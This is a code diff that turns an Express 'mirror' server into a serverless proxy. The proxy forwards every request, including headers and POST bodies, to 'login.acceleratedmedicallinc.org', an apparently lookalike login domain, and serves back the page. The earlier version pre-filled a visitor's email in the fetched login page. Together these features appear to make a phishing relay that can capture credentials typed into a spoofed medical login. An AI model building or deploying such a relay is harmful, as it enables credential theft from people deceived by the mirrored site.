@@ -1,27 +1,32 @@
-const express = require("express");
-const fetch = require("node-fetch");
-const app = express();
+import fetch from 'node-fetch';
 
-const BACKEND_URL = "https://login.acceleratedmedicallinc.org";
+const BACKEND_URL = 'https://login.acceleratedmedicallinc.org'; // or your actual backend
 
-app.get("/", (req, res) => {
-  res.sendFile(__dirname + "/index.html");
-});
-
-app.get("/mirror", async (req, res) => {
+export default async function handler(req, res) {
   try {
-    const email = req.query.email ? `?email=${encodeURIComponent(req.query.email)}` : "";
-    const response = await fetch(`${BACKEND_URL}${email}`);
-    const html = await response.text();
-    res.set("Content-Type", "text/html");
-    res.send(html);
-  } catch (err) {
-    console.error(err);
-    res.status(500).send("Error loading content.");
-  }
-});
+    const path = req.url.replace(/^\/api\/proxy/, '') || '/';
+    const fullUrl = `${BACKEND_URL}${path}`;
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log("Mirror frontend running on port " + PORT);
-});
+    console.log("Proxying to:", fullUrl);
+
+    const init = {
+      method: req.method,
+      headers: { ...req.headers },
+    };
+
+    if (req.method !== 'GET' && req.method !== 'HEAD') {
+      init.body = req;
+    }
+
+    const backendRes = await fetch(fullUrl, init);
+
+    const contentType = backendRes.headers.get('content-type') || 'text/html';
+    const body = await backendRes.text();
+
+    res.setHeader('Content-Type', contentType);
+    res.status(backendRes.status).send(body);
+  } catch (error) {
+    console.error("Proxy error:", error);
+    res.status(500).send("Proxy failed: " + error.message);
+  }
+}
